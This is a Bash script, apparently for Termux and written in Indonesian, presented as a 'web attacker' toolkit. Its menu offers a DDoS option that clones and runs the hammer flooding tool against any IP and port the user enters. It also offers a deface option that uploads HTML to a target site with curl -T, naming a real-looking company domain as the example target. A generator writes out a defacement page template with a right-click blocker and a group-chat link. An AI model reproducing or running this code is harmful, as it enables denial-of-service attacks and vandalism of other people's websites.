#yang Recode kebangetan!
#anak SD belajar sehari jadi

clear
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
purple="\033[35;1m"
white="\033[37;1m"
cyan="\033[36;1m"
red="\033[31;1m"

clear

echo $red
cat <<- "EOF"
  
   _____   __    __
  /  _  \_/  |__/  |________
 /  /_\  \   __\   __\ W E B \ 
/    |    \  |  |  |A C K E R \ 
\____|__  /__|  |__|__________/
        \/            
EOF

echo "===============================
author : SAM$
channel: Sam Silence CH 
===============================" | lolcat
echo $red"[!] ctrl+c untuk menghentikan
"
sleep 1
echo $green"[1] IP finder
[2] DDOS (hammer)
[3] Deface
[4] Deface Creator
[5] Web Grabber
[0] Keluar"
echo  
read -p "masukan pilihan: " pil

if [ $pil = 1 ]
then
sleep 1
clear
echo $indigo
figlet IPfinder
echo $red"[!]data harus diaktifkan
[!] ctrl+c untuk menghentikan"
echo $green
read -p "[:]masukan alamat web (tanpa https://): " ping
echo  
ping $ping
fi

if [ $pil = 2 ]
then
sleep 1
clear
git clone https://github.com/cyweb/hammer
clear
cd hammer
echo $indigo
figlet DDOS
echo $red"[!] ctrl+c untuk menghentikan"
echo $green
read -p "masukan IP                  : " ip
read -p "masukan port (default 80)   : " pr
read -p "masukan turbo (default 135) : " tr
clear
python hammer.py -s $ip -p $pr -t $tr
fi

if [ $pil = 3 ]
then
clear
echo $indigo
figlet Deface
echo $red"[!] taruh script html di penyimpanan internal
[!] jika ingin tebas index ubah nama script (index.html)"
echo $green
read -p "masukan script (contoh.html)             : " script
read -p "masukan target (http://centraltech.co.za): " target
curl -T /storage/emulated/0/$script $target
echo $white
echo "cek $target
jika tidak berhasil coba cek $target/namascriptmu.html
jika tidak bisa... yasudah cari web lain yg Vuln"
fi

if [ $pil = 4 ]
then
clear
echo $indigo
figlet Creator
echo $red"[!] bikinnya yang bagus
[!] ctrl+c untuk menghentikan"
echo $green
read -p "nama script         : " nm
read -p "title(header)       : " tt
read -p "judul               : " jd
read -p "pop up              : " pu
read -p "gambar tengah(url)  : " gt
read -p "pesan               : " ps
read -p "warna pesan(red,dll): " wr
read -p "background(url)     : " bg
read -p "ikon(url)           : " ik
read -p "youtube code(url)   : " yt
cat > $nm.html <<EOF
<html><head><title>$tt</title></head>
<script>
var pesen="$pu";
///////////////////////////////////
function clickIE4(){if (event.button==2){alert(pesen);return false;}}
function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(pesen);return false;}}}
if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;}
else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;}
document.oncontextmenu=new Function("alert(pesen);return false")
</script>
<body>
<br>
<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Anton' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Josefin Sans' rel='stylesheet' type='text/css'>
<body bgcolor="#000000" background =$bg><div class='CenterDiv'>
<center>
<h1><center><font color="$wr" size=8 face=Orbitron>$jd</center></font>
<img src=$gt width=450px height=340px>
<body onload="init()"></body>
<body>
<div id="bulle"></div>
<script language="JavaScript">
var i=0
var j=0
var texteNE, affiche
var texte="<br><br><br><br><br><font face=Orbitron color=$wr size=6><br>$ps</br><br><br></font><br></b></div>"
var ie = (document.all);
var ne = (document.layers); 
function init(){
texteNE='';
machine_a_ecrire();
}
function machine_a_ecrire(){
texteNE=texteNE+texte.charAt(i)
affiche='<font face=Orbitron size=1 color=#ffffff><strong>Messenge : '+texteNE+'</strong></font>'
if (texte.charAt(i)=="<") {
j=1
}
if (texte.charAt(i)==">") {
j=0
}
if (j==0) {
if (document.getElementById) { // avec internet explorer
document.getElementById("bulle").innerHTML = affiche;
}
}
if (i<texte.length-1){
i++
setTimeout("machine_a_ecrire()",70)
}
else
return
}
</script><font face="Orbitron" size="1"><blink><span style="color: rgb(255, 255, 255);"><b><font color=$wr size=4></font></b></u></blink><br></font></b>
<a href="https://chat.whatsapp.com/HNFEqQmKrZJC4c4BZzht10"><img style="position:fixed;bottom:10px;z-index:1000;right:10px;"  src="$ik" type="image/gif" width="150"></a></body>
<!-- CSS --><style>
.CenterDiv{width:650px;border:1px #ff0000 solid;padding:5px;margin:0px auto; background: url('http://i.imgur.com/sDbaMsW.gif');}
</style>
<br>
<embed src="$yt&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="0" height="0"></embed>

EOF
sleep 1
echo $white"SCRIPT SUDAH JADI>>"$cyan $nm.html
fi

if [ $pil = 5 ]
then
clear
echo $indigo
figlet Grabber
echo $red"[!] ctrl+c untuk menghentikan"
echo $green
read -p "nama file      : " wg
read -p "ekstensi (html): " fr
read -p "url (target)   : " ut 
echo $white"tunggu"
curl -o $wg.$fr $ut
clear
echo "tersimpan dengan nama" $green"$wg.html"
fi

if [ $pil = 0 ]
then
clear
sleep 2
echo $white"$sy: thank you!
SAM$: iya, sama-sama wkwk"
sleep 1
clear
exit
fi